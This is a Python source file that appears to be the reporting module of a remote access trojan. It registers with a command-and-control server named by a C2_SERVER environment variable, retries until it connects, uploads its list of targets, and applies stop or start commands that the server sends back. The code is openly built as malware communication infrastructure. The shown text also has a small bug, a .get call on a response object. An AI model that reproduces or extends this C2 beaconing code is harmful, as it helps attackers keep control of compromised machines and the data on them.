
import os
import time
import requests
from tasker import TaskManager
from dotenv import load_dotenv
load_dotenv()

class Report:
    """ Report data to the c2 server """
    _instance = None
    def __new__(cls, _):
        """ Make class signleton """
        if cls._instance is None:
            cls._instance = super(Report, cls).__new__(cls)
        return cls._instance

    def __init__(self, pinecone_namespace):
        self.key = os.environ.get("RAT_KEY")
        self.c2server = os.environ.get("C2_SERVER")
        self.s = requests.Session()
        res = {}
        while True:
            try:
                res = self.s.post(
                        self.c2server+"/api/v0/rat/register",
                        json={
                            "key": self.key,
                            "pinecone_namespace": pinecone_namespace
                        }
                    )
                if res.status_code != 200:
                    print(f"ERROR: failed to initialise c2 communication! Error: '{res.get('error')}' Retrying in 2 seconds..")
                    time.sleep(2)
                    continue
                res = res.json()
                break
            except Exception as err: #pylint: disable=broad-except
                    print(f"ERROR: failed to initialise c2 communication! Error: '{err}' Retrying in 2 seconds..")
                    time.sleep(2)
        self.task_manager = TaskManager()
        self.client_id = res['client_id']

    def _update_target_list(self):
        """ Send report of target list and update task manager based on returned data """
        print("updating: ", self.task_manager.target_list.get_targets())
        response = self.s.post(
            self.c2server+"/api/v0/rat/targetlist",
            json={
                "target_list": self.task_manager.target_list.export_json()
                }
        )

        changes = response.json().get("changes")
        for change in changes:
            self.task_manager.target_list.set_stopped_state(change['target'], change['stopped'])


    def run(self):
        """
            Run a general report.

            This function should send all reports to the c2 server every-time its called.
        """
        self._update_target_list()


